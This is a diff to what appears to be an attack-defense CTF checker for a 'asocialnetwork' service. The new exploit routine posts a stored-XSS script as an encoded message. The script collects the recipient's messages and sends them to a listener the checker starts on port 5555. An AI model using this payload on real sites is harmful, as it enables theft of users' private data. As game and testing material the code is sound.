@@ -1,3 +1,4 @@
+import json
 import secrets
 from typing import Optional
 from httpx import AsyncClient
@@ -17,6 +18,10 @@ from enochecker3.utils import FlagSearcher, assert_equals, assert_in
 import time
 from selenium import webdriver
 from webdriver_manager.chrome import ChromeDriverManager
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import threading
+HOST = "0.0.0.0"
+PORT = 5555
 
 SERVICE_PORT = 3000
 checker = Enochecker("asocialnetwork", SERVICE_PORT)
@@ -24,6 +29,7 @@ app = lambda: checker.app
 
 
 def encode(message, recipient):
+    recipient = recipient * (len(message) // len(recipient) + 1)
     return functools.reduce(lambda a, b: a+b, ([chr(ord(a) ^ ord(b)) for (a,b) in zip(message, recipient)]))
 
 
@@ -44,7 +50,7 @@ async def login(task, client, username, password, logger):
 async def sendMessage(task, client, recipient, message, logger):
     username = secrets.token_hex(32)
     password = secrets.token_hex(32)
-    encoded_message = encode(message, recipient * (len(message) // len(recipient) + 1))
+    encoded_message = encode(message, recipient)
     cookie = await register(task, client, username, password, logger)
     await client.post(f"{task.address}/messages/", json={"recipient": recipient, "message": encoded_message}, cookies=cookie)
     return username, password, cookie
@@ -58,7 +64,7 @@ async def retrieveMessage(task, client, recipient, logger, username, password):
     return r
 
 @checker.putflag(0)
-async def putflag0(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> None:
+async def putflag0(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_db: ChainDB, logger: LoggerAdapter) -> str:
     flag = task.flag
     logger.debug(task.address)
     recipient = "admin"
@@ -66,6 +72,7 @@ async def putflag0(task: PutflagCheckerTaskMessage, client: AsyncClient, chain_d
     r = await retrieveMessage(task, client, recipient, logger, username, password)
     assert_in(flag, r.text, "flag missing from messages")
     await chain_db.set("userdata", (username, password, flag))
+    return json.dumps({'username': username})
 
 
 @checker.getflag(0)
@@ -97,11 +104,49 @@ async def getnoise0(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: C
     assert_in(noise, r.text, "noise missing from note")
 
 
+exploitMessage = """<script>function getText(){let text='';let messages = document.getElementsByClassName('message');for(let i = 0; i < messages.length; i++){text += messages[i].innerHTML;}return text; }fetch('http://localhost:5555/', {method: 'POST', body:'username=' + getText(),headers: { 'Content-Type': 'application/x-www-form-urlencoded', },}); </script>"""
+result = [None]
+
+webServer = [None]
+def server(logger):
+    class MyServer(BaseHTTPRequestHandler):
+        def do_GET(self):
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
+            self.end_headers()
+            self.wfile.write("<html><head><title>ASocialNetwork</title></head>".encode())
+
+        def do_POST(self):
+            content_length = int(self.headers['Content-Length'])
+            post_data = self.rfile.read(content_length)
+            logger.debug(post_data)
+            result[0] = post_data.decode()
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
+            self.end_headers()
+            self.wfile.write("<html><head><title>ASocialNetwork</title></head>".encode())
+    webServer[0] = HTTPServer((HOST, PORT), MyServer)
+    print("Server started http://%s:%s" % (HOST, PORT))
+    try:
+        webServer[0].serve_forever()
+    except KeyboardInterrupt:
+        pass
+
+    webServer[0].server_close()
+    print("Server stopped.")
+
+
 @checker.exploit(0)
 async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger:LoggerAdapter) -> Optional[str]:
-    r = await client.get(f"{task.address}/messages/admin")
-    assert not r.is_error
-    if flag := searcher.search_flag(r.text):
+    threading.Thread(target=server, args=(logger, )).start()
+    cookie = await login(task, client, "a", "a", logger)
+    r = await client.post(f"{task.address}/messages/", json={"recipient": task.attack_info, "message": encode(exploitMessage, task.attack_info)}, cookies=cookie)
+    assert_equals(r.status_code, 200, "exploit failed")
+    while not result[0]:
+        time.sleep(0.1)
+    logger.debug(result[0])
+    webServer[0].server_close()
+    if flag := searcher.search_flag(result[0]):
         return flag
 
 
@@ -119,6 +164,6 @@ def xss(task, start, logger):
     logger.debug(reloads)
     driver.quit()
 
-
 if __name__ == "__main__":
     checker.run()
+
